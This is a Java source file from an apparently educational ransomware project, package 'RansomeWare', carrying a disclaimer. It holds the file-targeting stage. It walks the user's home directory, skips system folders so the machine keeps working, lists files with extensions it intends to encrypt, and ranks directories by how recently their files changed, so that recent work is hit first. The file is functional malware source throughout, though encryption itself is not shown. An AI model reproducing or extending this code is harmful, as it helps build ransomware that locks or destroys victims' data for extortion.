/********************************************************************
    _____                        _        _
   |_   _|                      | |      | |
     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
   __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


Copyright (c) 2019 Kyra Mozley
Created on 18/07/19
Version 1.0

Disclaimer: This project is purely for educational purposes 
DO NOT RUN THIS ON YOUR PERSONAL MACHINE
EXECUTE ONLY IN A TEST ENVIRONMENT
DO NOT USE FOR MALICIOUS ACTIVITY 

 *********************************************************************/
package RansomeWare;


import java.io.*;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;

import static java.util.Map.Entry.comparingByValue;
import static java.util.stream.Collectors.toMap;


public class FindFiles {
    BufferedWriter fileWriter;

    //List of filetypes we want to encrypt
    List<String> allowedFiles;
    HashMap<String, Integer> directoryScore = new HashMap<>();
    HashMap<String, Integer> directoryFileCount = new HashMap<>();


    public void FindFiles() throws Exception {
        //Use System Property rather than C:\\ to make it OS independent

        String home = System.getProperty("user.home");

        //FOR DEVELOPMENT - NOT READY TO ENCRYPT EVERYTHING - JUST THE DOCUMENTS FOLDER
        //String home = System.getProperty("user.home")+ File.separator + "Desktop" + File.separator + "Documents";

        //Creating a file to write the files found into
        Writer writer = new FileWriter(System.getProperty("user.home") + File.separator + "output.txt", false);
        fileWriter = new BufferedWriter(writer);

        //List of allowed files

        allowedFiles = new FileTypes().AllowedTypes;

        //Traverse the file system
        traverse(home);
        fileWriter.close();
        hashToFile();
    }
    public void traverse(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if (f.isDirectory()) {
                String name = f.getName();
                if (name.equals("Windows") || name.equals("ProgramData") || name.equals("ProgramFiles") || name.equals("Boot") || name.equals("Library")) return; //want system to still work
                traverse(f.getAbsolutePath());

            } else {

                //split to get file extension
                int index = f.getName().lastIndexOf(".");
                String fileType = f.getName().substring(index + 1);

                //if file extension is allowed, write to file
                if(allowedFiles.contains("." + fileType.toUpperCase())) {
                    //if directory already in map, update score
                    if(directoryScore.containsKey(f.getParent())) {
                        int currentScore = directoryScore.get(f.getParent());
                        directoryScore.put(f.getParent(), getScore(f) + currentScore);

                        Integer fileCount = directoryFileCount.get(f.getParent());
                        directoryFileCount.put(f.getParent(), fileCount+1);
                    } else {
                        //else add it in
                        directoryScore.put(f.getParent(), getScore(f));
                        directoryFileCount.put(f.getParent(), 1);
                    }
                    fileWriter.write(f.getAbsolutePath());
                    fileWriter.newLine();
                }
            }
        }
    }

    public int getScore(File file) {
       //files last modified date
        long lastModified = file.lastModified();
        Date lastMod = new Date(lastModified);

        //working out how to score it
        long currentTimeMillis = System.currentTimeMillis();
        Date date = new Date(currentTimeMillis- TimeUnit.DAYS.toMillis(1)); //last 24hrs
        Date lastWeek = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(7)); //this week
        Date twoWeeks = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(14)); //last 2 weeks
        Date lastMonth = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(30)); //this month
        Date last3Months = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(90)); //last 3 months


        if(lastMod.after(date)) {
            return 256;
        } if(lastMod.after(lastWeek)) {
            return 64;
        } if(lastMod.after(twoWeeks)) {
            return 16;
        } if(lastMod.after(lastMonth)) {
            return 8;
        } if (lastMod.after(last3Months)) {
            return 2;
        }

        return 0;
    }

    public void hashToFile() throws Exception {
        Writer writer = new FileWriter(System.getProperty("user.home") + File.separator + "directory.txt", false);
        fileWriter = new BufferedWriter(writer);

        //update scores to averaged ones
        for(String dir: directoryScore.keySet()) {
            //score = sum of files in directories scores / number of files in directory
            directoryScore.put(dir, directoryScore.get(dir)/directoryFileCount.get(dir));
        }

        //sort in assending order
        HashMap<String, Integer> newdirectoryScore = directoryScore.entrySet().stream().sorted(
                comparingByValue()).collect(toMap(e -> e.getKey(), e-> e.getValue(), (e1, e2) -> e2, LinkedHashMap::new));


        //write to file
        for(String dir: newdirectoryScore.keySet()) {
            fileWriter.write(dir);
            fileWriter.newLine();
        }

        fileWriter.close();

    }



    public static void main(String[] args) throws Exception {
        FindFiles ff = new FindFiles();
        ff.FindFiles();
    }

}
